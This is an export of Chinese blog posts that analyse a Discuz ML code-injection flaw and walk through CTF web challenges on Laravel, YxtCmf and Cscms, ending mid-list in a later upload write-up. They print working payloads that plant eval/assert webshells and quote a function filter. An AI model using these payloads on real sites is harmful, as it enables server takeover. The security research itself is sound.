    <content><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>7月11号Discuz ML被爆出存在任意代码注入漏洞，Discuz在国内的用户量还是很可观的，国外还没有去关注，从官方下载源码对漏洞的原理详细的分析了一下，源码地址(<a href="http://discuz.ml/download）" target="_blank" rel="noopener">http://discuz.ml/download）</a></p>
<h1 id="0x01-POC"><a href="#0x01-POC" class="headerlink" title="0x01 POC"></a>0x01 POC</h1><figure class="highlight nix"><table><tr><td class="code"><pre><span class="line">GET / HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">6.1</span>; Win64; x64; rv:<span class="number">56.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">56.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;<span class="attr">q=0.9,*/*;q=0.8</span></span><br><span class="line">Accept-Language: zh-CN,zh;<span class="attr">q=0.8,en-US;q=0.5,en;q=0.3</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://<span class="number">127.0</span>.<span class="number">0.1</span>/CMS/discuz.ml/vot-discuz.ml-fa108dcc726d/upload/install/index.php?<span class="attr">method=ext_info&amp;language=sc</span></span><br><span class="line">Cookie: <span class="attr">UM_distinctid=16961881c34a-0be7f060296b93-173b7740-1a9640-16961881c35265;</span> <span class="attr">CNZZDATA5770257=cnzz_eid%3D1356317550-1552119465-%26ntime%3D1554215107;</span> ECS[visit_times]=<span class="number">11</span>; <span class="attr">CNZZDATA1257137=cnzz_eid%3D591241165-1552785038-%26ntime%3D1552785038;</span> <span class="attr">GK9p_2132_saltkey=ek5JjJGL;</span> <span class="attr">GK9p_2132_lastvisit=1562973338;</span> <span class="attr">GK9p_2132_sid=SW5SHK;</span> <span class="attr">GK9p_2132_lastact=1562977009%09forum.php%09;</span> <span class="attr">O2FL_2132_saltkey=ao6mCm4C;</span> <span class="attr">O2FL_2132_language=sc%27.phpinfo().%27;</span> <span class="attr">O2FL_2132_lastvisit=1562973840;</span> <span class="attr">O2FL_2132_sid=MVTcHf;</span> <span class="attr">O2FL_2132_lastact=1562977475%09index.php%09;</span> <span class="attr">O2FL_2132_sendmail=1;</span> <span class="attr">O2FL_2132_onlineusernum=1</span></span><br><span class="line">Connection: keep-alive</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">Cache-Control: <span class="attr">max-age=0</span></span><br></pre></td></tr></table></figure>
<p>主要就是</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">O2FL_2132_language</span>=sc%<span class="number">27</span>.phpinfo().%<span class="number">27</span><span class="comment">;</span></span><br></pre></td></tr></table></figure>
<h1 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h1><p>这里分析Discuz ML v3.4源码，该漏洞主要是通过控制缓存文件的内容，之后缓存文件又被系统调用从而触发，根据POC可知是通过构造Cookie中language的值进行代码注入，在language中构造错误代码判断漏洞触发文件。<br><img src="/2019/07/13/Discuz-ML-V3-x-%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/8418106-5546b002e81634b2.png" alt>)都是require()和include()报错，也就是说是包涵的文件出了问题，到forum_index.php中查看一下<br><img src="/2019/07/13/Discuz-ML-V3-x-%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/8418106-87b0c63cbf32bc4f.png" alt></p>
<p>这里是调用缓存文件，根据报错信息可以知道导致报错的缓存文件是：data/template/sc’<em>1</em>1_common_header_forum_index.tpl.php，很明显文件名中有部分片段是取自language的值，同时也就是说构造的POC会被植入到缓存文件中，跟进到template()中查看缓存文件的生成规则(function_code.php 644行)<br><img src="/2019/07/13/Discuz-ML-V3-x-%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/8418106-d4405e372a735f5a.png" alt></p>
<p>很明显，缓存文件的命名规则由多部分组成，其中第一部分区自DISCUZ_LANG，根据前面的报错信息也可以知道，这个变量的值也就是Cookie中language字段的值，该函数最终返回DISCUZ_ROOT.$cachefile，可想而知，最终返回的便是缓存文件路劲用于文件包含，这里追溯一下DISCUZ_LANG（discuz_application.php定义）<br><img src="/2019/07/13/Discuz-ML-V3-x-%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/8418106-778fad6fd153991e.png" alt></p>
<p>DISCUZ_LANG的值取自于变量$lng，变量$lng的值取自于cookie language</p>
<p><img src="/2019/07/13/Discuz-ML-V3-x-%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/8418106-b1ecc65c366bae82.png" alt></p>
<p>很明显language字段的值没有经过任何过滤直接传到了变量$lng的值，直接用该字段对缓存文件进行命名，这也是导致该漏洞触发的直接原因。<br>接下来分析一下注入的代码是如何植入到缓存文件中的，定位到template类进行分析（class_template.php），在Discuz程序运行过程中，会读取template/default/common/目录下的默认模版<br><img src="/2019/07/13/Discuz-ML-V3-x-%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/8418106-a287539e7addd13b.png" alt></p>
<p>模版读取的内容传入到变量$template中，并对$template进行字符串替换操作</p>
<p><img src="/2019/07/13/Discuz-ML-V3-x-%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/8418106-d94578bccb4b9a6f.png" alt></p>
<p>关键点在于变量$header</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$headeradd</span> .= <span class="string">"|| checktplrefresh('<span class="variable">$tplfile</span>', '<span class="variable">$fname</span>', "</span>.time().<span class="string">", '<span class="variable">$templateid</span>', '<span class="variable">$cachefile</span>', '<span class="variable">$tpldir</span>', '<span class="variable">$file</span>')\n"</span>;</span><br></pre></td></tr></table></figure>
<p>将checktplrefresh也写入到缓存文件中，文件内容类型于</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">&lt;?php <span class="keyword">if</span>(!defined(<span class="string">'IN_DISCUZ'</span>)) <span class="keyword">exit</span>(<span class="string">'Access Denied'</span>); </span><br><span class="line"><span class="number">0</span></span><br><span class="line">|| checktplrefresh(<span class="string">'./template/default/common/xxx'</span>, <span class="string">'./template/default/common/xxx'</span>, <span class="number">1562977476</span>, <span class="string">'1'</span>, <span class="string">'./data/template/[$cachefile]'</span>, <span class="string">'./template/default'</span>, <span class="string">'common/xxx'</span>)</span><br><span class="line">;?&gt;</span><br></pre></td></tr></table></figure>
<p>结合上面的分析，其中变量$cachefile是我们可以控制的，也就是说控制生成的恶意变量名会被当作变量值写入到缓存文件中，别切恰好缓存文件会担子template()函数的返回值直接被包涵调用，这就太完美了，结合一下代码拼接，所以直接在language字段构造任意代码，例如<code>sc&#39;.phpinfo().&#39;</code>(sc也可以不要)，查看生成的缓存文件的内容。<br><img src="/2019/07/13/Discuz-ML-V3-x-%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/8418106-ef036968e1375f53.png" alt><br>由于代码包含的原因，所以注入到缓存文件中的恶意代码直接执行，其中首页就有包涵，全局搜索一下的话，应该有不少地方有进行包含可以直接利用。</p>
<h1 id="0x03-修复建议"><a href="#0x03-修复建议" class="headerlink" title="0x03 修复建议"></a>0x03 修复建议</h1><p>缓存缓文件名固定即可，加过滤的话也很容易被绕过。</p>
<h5 id="由于是任意代码注入漏洞，而且漏洞利用方式很简单，而且国内discuz的论坛较多，所以影响会很大。"><a href="#由于是任意代码注入漏洞，而且漏洞利用方式很简单，而且国内discuz的论坛较多，所以影响会很大。" class="headerlink" title="由于是任意代码注入漏洞，而且漏洞利用方式很简单，而且国内discuz的论坛较多，所以影响会很大。"></a>由于是任意代码注入漏洞，而且漏洞利用方式很简单，而且国内discuz的论坛较多，所以影响会很大。</h5>]]></content>
      <categories>
        <category>Cyc1e的漏洞分析之路</category>
      </categories>
      <tags>
        <tag>CVE</tag>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>强网杯决赛RW的3个Web题</title>
    <url>/2019/06/16/%E5%BC%BA%E7%BD%91%E6%9D%AF%E5%86%B3%E8%B5%9BRW%E7%9A%843%E4%B8%AAWeb%E9%A2%98/</url>
    <content><![CDATA[<p><strong>这次真的是神仙打架，web狗无处苟活，AWD只有PWN题，所以Web狗只能奋力怼RW的3个web，这里不得不膜一下大师傅们，审得太快了，第二天排队排太久，啥血也没抢到，简单写下3个web的解题思路……这里放下源码，方便复现（<a href="https://pan.baidu.com/s/1WngiF9tTCMZq7SKqDaOa6g" target="_blank" rel="noopener">https://pan.baidu.com/s/1WngiF9tTCMZq7SKqDaOa6g</a> 提取码: kj7b）</strong></p>
<h1 id="0x01-laravel"><a href="#0x01-laravel" class="headerlink" title="0x01 laravel"></a>0x01 laravel</h1><p>这个下发的版本是5.7，并且之前有人发表过对该版本的漏洞的分析文章，所以这题差不多算是一个web签到题，这里贴一下链接:<a href="https://laworigin.github.io/2019/02/21/laravelv5-7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce/" target="_blank" rel="noopener">https://laworigin.github.io/2019/02/21/laravelv5-7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce/</a><br>在写这个分析文章的时候，大师傅可能避嫌把这个页面关了，也就是在程序流处理过程中，我们可以控制序列化的内容，所以只要构造一个反序列化点就可以触发该反序列RCE漏洞，刚好这个题目的设定就是给了反序列化点的。<br>/public/index.php:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">namespace App\Http\Controllers;</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">class TaskController</span><br><span class="line">&#123;</span><br><span class="line">    public function index()</span><br><span class="line">    &#123;</span><br><span class="line">        if(isset($_GET[&#39;code&#39;]))</span><br><span class="line">        &#123;</span><br><span class="line">            $code &#x3D; $_GET[&#39;code&#39;];</span><br><span class="line">            unserialize($code);</span><br><span class="line">            return &quot;Welcome to qiangwangbei!&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>这里给了一个反序列化利用点所以我们只要把序列化的内容赋给code参数就可以了，直接贴Exp代码（反正也不是我写的,因为赛制要求拿到shell，而且只有<strong>index.php</strong>可写，这个地方坑了我的第一次机会，吐槽一下）<br><strong>get.php</strong>：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Testing</span>&#123;</span></span><br><span class="line"><span class="php">	<span class="class"><span class="keyword">class</span> <span class="title">PendingCommand</span></span>&#123;</span></span><br><span class="line"><span class="php">		<span class="keyword">protected</span> $command;</span></span><br><span class="line"><span class="php">		<span class="keyword">protected</span> $parameters;</span></span><br><span class="line"><span class="php">		<span class="keyword">protected</span> $app;</span></span><br><span class="line"><span class="php">		<span class="keyword">public</span> $test;</span></span><br><span class="line"></span><br><span class="line"><span class="php">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($command, $parameters,$class,$app)</span></span></span></span><br><span class="line"><span class="php">	    &#123;</span></span><br><span class="line"><span class="php">	        <span class="keyword">$this</span>-&gt;command = $command;</span></span><br><span class="line"><span class="php">	        <span class="keyword">$this</span>-&gt;parameters = $parameters;</span></span><br><span class="line"><span class="php">	        <span class="keyword">$this</span>-&gt;test=$class;</span></span><br><span class="line"><span class="php">	        <span class="keyword">$this</span>-&gt;app=$app;</span></span><br><span class="line"><span class="php">	    &#125;</span></span><br><span class="line"><span class="php">	&#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Auth</span>&#123;</span></span><br><span class="line"><span class="php">	<span class="class"><span class="keyword">class</span> <span class="title">GenericUser</span></span>&#123;</span></span><br><span class="line"><span class="php">		<span class="keyword">protected</span> $attributes;</span></span><br><span class="line"><span class="php">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(array $attributes)</span></span>&#123;</span></span><br><span class="line"><span class="php">	        <span class="keyword">$this</span>-&gt;attributes = $attributes;</span></span><br><span class="line"><span class="php">	    &#125;</span></span><br><span class="line"><span class="php">	&#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>&#123;</span></span><br><span class="line"><span class="php">	<span class="class"><span class="keyword">class</span> <span class="title">Application</span></span>&#123;</span></span><br><span class="line"><span class="php">		<span class="keyword">protected</span> $hasBeenBootstrapped = <span class="keyword">false</span>;</span></span><br><span class="line"><span class="php">		<span class="keyword">protected</span> $bindings;</span></span><br><span class="line"></span><br><span class="line"><span class="php">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($bind)</span></span>&#123;</span></span><br><span class="line"><span class="php">			<span class="keyword">$this</span>-&gt;bindings=$bind;</span></span><br><span class="line"><span class="php">		&#125;</span></span><br><span class="line"><span class="php">	&#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
<p><strong>rce.php</strong>：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">include</span>(<span class="string">"get.php"</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> Illuminate\Foundation\Testing\PendingCommand(<span class="string">"system"</span>,<span class="keyword">array</span>(<span class="string">'echo "&lt;?php eval(\$_REQUEST[Cyc1e]);?&gt;" &gt; index.php'</span>),<span class="keyword">new</span> Illuminate\Auth\GenericUser(<span class="keyword">array</span>(<span class="string">"expectedOutput"</span>=&gt;<span class="keyword">array</span>(<span class="string">"0"</span>=&gt;<span class="string">"1"</span>),<span class="string">"expectedQuestions"</span>=&gt;<span class="keyword">array</span>(<span class="string">"0"</span>=&gt;<span class="string">"1"</span>))),<span class="keyword">new</span> Illuminate\Foundation\Application(<span class="keyword">array</span>(<span class="string">"Illuminate\Contracts\Console\Kernel"</span>=&gt;<span class="keyword">array</span>(<span class="string">"concrete"</span>=&gt;<span class="string">"Illuminate\Foundation\Application"</span>))))));</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>GET方式把payload打过去就好了</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">URL：/index.php/<span class="keyword">index</span>?code=O%3A44%3A%22Illuminate%5CFoundation%5CTesting%5CPendingCommand%22%3A4%3A%7Bs%3A10%3A%22%00%2A%00command%22%3Bs%3A6%3A%22system%22%3Bs%3A13%3A%22%00%2A%00parameters%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A50%3A%22echo+%22%3C%3Fphp+<span class="keyword">eval</span>%28%5C%24_REQUEST%5Bpass%5D%29%3B%3F%3E%22+%3E+index.php%22%3B%7Ds%3A6%3A%22%00%2A%00app%22%3BO%3A33%3A%22Illuminate%5CFoundation%5CApplication%22%3A2%3A%7Bs%3A22%3A%22%00%2A%00hasBeenBootstrapped%22%3Bb%3A0%3Bs%3A11%3A%22%00%2A%00bindings%22%3Ba%3A1%3A%7Bs%3A35%3A%22Illuminate%5CContracts%5CConsole%5CKernel%22%3Ba%3A1%3A%7Bs%3A8%3A%22concrete%22%3Bs%3A33%3A%22Illuminate%5CFoundation%5CApplication%22%3B%7D%7D%7Ds%3A4%3A%22test%22%3BO%3A27%3A%22Illuminate%5CAuth%5CGenericUser%22%3A1%3A%7Bs%3A13%3A%22%00%2A%00attributes%22%3Ba%3A2%3A%7Bs%3A14%3A%22expectedOutput%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A1%3A%221%22%3B%7Ds%3A17%3A%22expectedQuestions%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A1%3A%221%22%3B%7D%7D%7D%7D</span><br></pre></td></tr></table></figure>



<h1 id="0x02-YxtCmf"><a href="#0x02-YxtCmf" class="headerlink" title="0x02 YxtCmf"></a>0x02 YxtCmf</h1><p>第一天的下午一直在审这个cmf框架的源码，是基于ThinkPhp框架进行二次开发的，thinphp的缓存机制算是比较有意思的，主要思路是通过控制缓存文件来拿shell，查看thinkcmf的一个文档<br><img src="/2019/06/16/%E5%BC%BA%E7%BD%91%E6%9D%AF%E5%86%B3%E8%B5%9BRW%E7%9A%843%E4%B8%AAWeb%E9%A2%98/8418106-d33cace0a96442b9.png" alt><br>设置了动态更新系统配置的函数，查看一下sp_set_dynamic_config函数的内容</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sp_set_dynamic_config</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>(!is_array($data))&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>(sp_is_sae())&#123;</span><br><span class="line">		$kv = <span class="keyword">new</span> SaeKV();</span><br><span class="line">		$ret = $kv-&gt;init();</span><br><span class="line">		$configs=$kv-&gt;get(<span class="string">"THINKCMF_DYNAMIC_CONFIG"</span>);</span><br><span class="line">		$configs=<span class="keyword">empty</span>($configs)?<span class="keyword">array</span>():unserialize($configs);</span><br><span class="line">		$configs=array_merge($configs,$data);</span><br><span class="line">		$result = $kv-&gt;set(<span class="string">'THINKCMF_DYNAMIC_CONFIG'</span>, serialize($configs));</span><br><span class="line">	&#125;<span class="keyword">elseif</span>(defined(<span class="string">'IS_BAE'</span>) &amp;&amp; IS_BAE)&#123;</span><br><span class="line">		$bae_mc=<span class="keyword">new</span> BaeMemcache();</span><br><span class="line">		$configs=$bae_mc-&gt;get(<span class="string">"THINKCMF_DYNAMIC_CONFIG"</span>);</span><br><span class="line">		$configs=<span class="keyword">empty</span>($configs)?<span class="keyword">array</span>():unserialize($configs);</span><br><span class="line">		$configs=array_merge($configs,$data);</span><br><span class="line">		$result = $bae_mc-&gt;set(<span class="string">"THINKCMF_DYNAMIC_CONFIG"</span>,serialize($configs),MEMCACHE_COMPRESSED,<span class="number">0</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		$config_file=<span class="string">"./data/conf/config.php"</span>;</span><br><span class="line">		<span class="keyword">if</span>(file_exists($config_file))&#123;</span><br><span class="line">			$configs=<span class="keyword">include</span> $config_file;</span><br><span class="line">		&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">			$configs=<span class="keyword">array</span>();</span><br><span class="line">		&#125;</span><br><span class="line">		$configs=array_merge($configs,$data);</span><br><span class="line">		$result = file_put_contents($config_file, <span class="string">"&lt;?php\treturn "</span> . var_export($configs, <span class="keyword">true</span>) . <span class="string">";"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	sp_clear_cache();</span><br><span class="line">	S(<span class="string">"sp_dynamic_config"</span>,$configs);</span><br><span class="line">	<span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>把$config和字符串“THINKCMF_DYNAMIC_CONFIG”，传入了set函数，set函数是一个写入缓存文件的函数，也就是把sp_set_dynamic_config传入的固定字符串处理后当作文件名生成，传入的$config的数据为缓存文件的内容，也就是说控制了缓存内容在拿到缓存文件名就可以控制缓存文件了，所以接下来就是找哪一个sp_set_dynamic_config函数我们可以用，因为题目环境设定是把admin、install等目录给去了，也就限制了利用访问，本菜习惯用notepad++,所以全局搜索sp_set_dynamic_config的调用情况，再排除一下，最终确定了\application\Api\Controller\OauthController.class.php中的sp_set_dynamic_config可以任意控制</p>
<figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">injectionAuthocode</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="symbol">$postdata</span>=I(<span class="string">'post.'</span>);</span><br><span class="line">        <span class="symbol">$co</span>nfigs[<span class="string">"authoCode"</span>]=<span class="symbol">$postdata</span>[<span class="string">'authoCode'</span>];</span><br><span class="line">        sp_set_dynamic_config(<span class="symbol">$co</span>nfigs);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>缓存文件里的内容是注释后的序列化值，所以构造一下post值换行再注释后面的语句就可以写入任意代码了</p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">POST：authoCode=Cyc<span class="number">1</span>e<span class="meta">%</span><span class="number">0</span>aeval<span class="comment">($_REQUEST[pass])</span>;<span class="comment">//</span></span><br></pre></td></tr></table></figure>
<p>接下来就是缓存文件名的问题了（毕竟缓存文件名是个md5值，爆破是不可能的），分析set函数即可，发现就是两个固定的字符串拼接处理，所以这就是一个固定的值了，缓存的文件名固定为ed182ead0631e95e68e008bc1d3af012.php，本地生成了直接上台打就行了，第一天下午就分析到这，卡在了路由触发规则上，大写的尴尬，到酒店继续看了下，是自己傻了，路由规则看错了，所以最后的payload<br> <figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">URL：<span class="regexp">/index.php/</span>api<span class="regexp">/oauth/i</span>njectionAuthocode</span><br><span class="line">POST：authoCode=Cyc1e%<span class="number">0</span>aeval(<span class="variable">$_REQUEST</span>[Cyc1e]);<span class="regexp">//</span></span><br><span class="line">PATH：<span class="regexp">/data/</span>runtime<span class="regexp">/Temp/</span>ed182ead0631e95e68e008bc1d3af012.php</span><br></pre></td></tr></table></figure><br>直接触发就好了</p>
<p><img src="https://upload-images.jianshu.io/upload_images/8418106-b6dc48cf00e8f738.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<h1 id="0x03-Cscms"><a href="#0x03-Cscms" class="headerlink" title="0x03 Cscms"></a>0x03 Cscms</h1><p>这题晚上才开始审，查了下最近报出的洞，发现这个cms好像是凉了的，最近的也就是17年的了，有一个SSTI的补丁，而且怎么找到找不到这个补丁的代码，就顺着这个思路去了，既然不让我找到，那估计就有问题的嘛，2333，这题给的题目信息一样是删除了admin、install目录，所以一样是前台的洞了，既然是SSTI，那肯定是有一个代码执行点的，全局搜索eval函数，最终定位到<br>\cscms\app\models\Csskins.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// php标签处理</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">cscms_php</span><span class="params">($php,$content,$str)</span> </span>&#123;</span><br><span class="line">        $evalstr=<span class="string">" return $content"</span>;</span><br><span class="line">	    $newsphp=<span class="keyword">eval</span>($evalstr);</span><br><span class="line">        $str=str_replace($php,$newsphp,$str);</span><br><span class="line">	    <span class="keyword">return</span> $str;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>只要控制了$content，就可以执行任意代码，进行函数的回溯，这个最难受了，就一个template_parse函数调用了cscms_php，定位php处理代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//PHP代码解析</span></span><br><span class="line">preg_match_all(<span class="string">'/&#123;cscmsphp&#125;([\s\S]+?)&#123;\/cscmsphp&#125;/'</span>,$str,$php_arr);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($php_arr[<span class="number">0</span>]))&#123;</span><br><span class="line">	<span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;count($php_arr[<span class="number">0</span>]);$i++)&#123;</span><br><span class="line">	      $str=<span class="keyword">$this</span>-&gt;cscms_php($php_arr[<span class="number">0</span>][$i],$php_arr[<span class="number">1</span>][$i],$str);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">unset</span>($php_arr);</span><br></pre></td></tr></table></figure>
<p>也就是说正则匹配{cscmsphp}([\s\S]+?){/cscmsphp}，把匹配到的数据传给cscms_php，再利用eval直接执行，分析到这逻辑就很清晰了，就是要找一个前台的调用了template_parse函数的地方，控制输入的内容，就可以实现任意代码执行，全局搜索调用情况，定位一个好调用的地方：\plugins\sys\home\Gbook.php（意见留言板，不用任何权限直接触发），其中的ajax函数对其进行了调用</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="variable">$Mark_Text</span>=<span class="variable">$this</span>-&gt;Csskins-&gt;template_parse(<span class="variable">$Mark_Text</span>,<span class="keyword">false</span>);</span><br></pre></td></tr></table></figure>
<p>也就是获取到留言板输入的内容，传入到template_parse函数中，所以我们构造留言数据的时候，加上{cscmsphp}{/cscmsphp}便签就会传到eval函数中，测试了下eval($_REQUEST[Cyc1e]);，然后失败了，尽然还有转义，也是很有意思，找到处理代码。<br> <figure class="highlight leaf"><table><tr><td class="code"><pre><span class="line">$str = preg_replace('<span class="function"><span class="keyword">#</span><span class="params">(<span class="variable">alert</span>|<span class="variable">prompt</span>|<span class="variable">confirm</span>|<span class="variable">cmd</span>|<span class="variable">passthru</span>|<span class="variable">eval</span>|<span class="variable">exec</span>|<span class="variable">expression</span>|<span class="variable">system</span>|<span class="variable">fopen</span>|<span class="variable">fsockopen</span>|<span class="variable">file</span>|<span class="variable">file_get_contents</span>|<span class="variable">readfile</span>|<span class="variable">unlink</span>)</span></span>(\s*)\((.*?)\)#si','\\1\\2&amp;#40;\\3&amp;#41;',$str);</span><br></pre></td></tr></table></figure><br>就过滤了这几个，所以构造下payload：</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line">URL：<span class="keyword">index</span>.php/gbook</span><br><span class="line">留言数据：&#123;cscmsphp&#125;assert($_REQUEST[Cyc1e]);&#123;/cscmsphp&#125;</span><br><span class="line">Shell：/<span class="keyword">index</span>.php/gbook/lists/<span class="number">1</span>?Cyc1e=phpinfo();</span><br></pre></td></tr></table></figure>
<p><img src="/2019/06/16/%E5%BC%BA%E7%BD%91%E6%9D%AF%E5%86%B3%E8%B5%9BRW%E7%9A%843%E4%B8%AAWeb%E9%A2%98/8418106-9f563edeb5d07a5b.png" alt></p>
<h3 id="0x04-小结"><a href="#0x04-小结" class="headerlink" title="0x04 小结"></a>0x04 小结</h3><p>总的来说，神仙打架，Web狗没前途，神仙们都不在意Web的那一丢丢分</p>
]]></content>
      <categories>
        <category>Cyc1e的CTF之路</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>RealWorld</tag>
      </tags>
  </entry>
  <entry>
    <title>2019 强网杯部分Web题及解题思路</title>
    <url>/2019/05/31/2019-%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E9%A2%98%E5%8F%8A%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/</url>
    <content><![CDATA[<h3 id="0x01-upload"><a href="#0x01-upload" class="headerlink" title="0x01 upload"></a>0x01 upload</h3><p>扫描得到源码文件：<a href="http://www.tar.gz" target="_blank" rel="noopener">www.tar.gz</a>，所以这道题目主要就是代码审计的工作，网站的主体功能代码在：application\web，漏洞触发点在Porfile</p>
<figure class="highlight livescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>($<span class="keyword">this</span>-&gt;ext) &#123;	<span class="keyword">if</span>(getimagesize($<span class="keyword">this</span>-&gt;filename_tmp)) &#123;</span><br><span class="line">	@copy($<span class="keyword">this</span>-&gt;filename_tmp, $<span class="keyword">this</span>-&gt;filename);</span><br><span class="line">	@unlink($<span class="keyword">this</span>-&gt;filename_tmp);	</span><br><span class="line">	$<span class="keyword">this</span>-&gt;img=<span class="string">"../upload/$this-&gt;upload_menu/$this-&gt;filename"</span>;	</span><br><span class="line">	$<span class="keyword">this</span>-&gt;update_img();	</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">	$<span class="keyword">this</span>-&gt;error(<span class="string">'Forbidden type!'</span>, url(<span class="string">'../index'</span>));</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;	</span><br><span class="line">        $<span class="keyword">this</span>-&gt;error(<span class="string">'Unknow file type!'</span>, url(<span class="string">'../index'</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>也就是说如果ext为1的话，就会执行copy操作，把最初上传的文件copy重命名为filename，所以利用逻辑就是上传一个图片木马，然后出发copy更名为一个.php文件就行了。</p>
<p>登录后在INDEX.php文件中对cookie进行了反序列化操作，在Register类中实例化了Profile类，所以最终的漏洞利用逻辑：</p>
<ol>
<li>注册一个账号，登录后上传一张图片木马。</li>
